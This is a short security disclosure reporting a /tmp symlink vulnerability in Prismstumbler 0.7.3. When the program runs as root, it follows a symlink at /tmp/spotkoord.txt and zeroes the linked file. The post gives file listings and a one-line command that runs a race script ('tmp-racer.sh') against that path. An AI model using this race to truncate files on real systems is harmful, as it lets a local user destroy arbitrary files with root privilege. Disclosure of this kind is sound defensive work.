I found a symlink vuln in this older program.

Prismstumbler 0.7.3 is most often ran as root to utilize all of capabilities.

Prismstumbler (pst) creates /tmp/.psintercom and /tmp/spotkoord.txt as default.  Can be changed within preferences.

srw-rw-rw-  1 root    root          0 2009-04-02 00:44 .psintercom
-rw-r--r--  1 root    root          0 2009-04-02 00:44 spotkoord.txt

The /tmp/spotkoord.txt file follows symlinks and zeros out linked file.  While /tmp/.psintercom actually checks to see if it is there or not.

#
guy@Tengu:~/Tools$ sh tmp-racer.sh /tmp/spotkoord.txt sudo pst
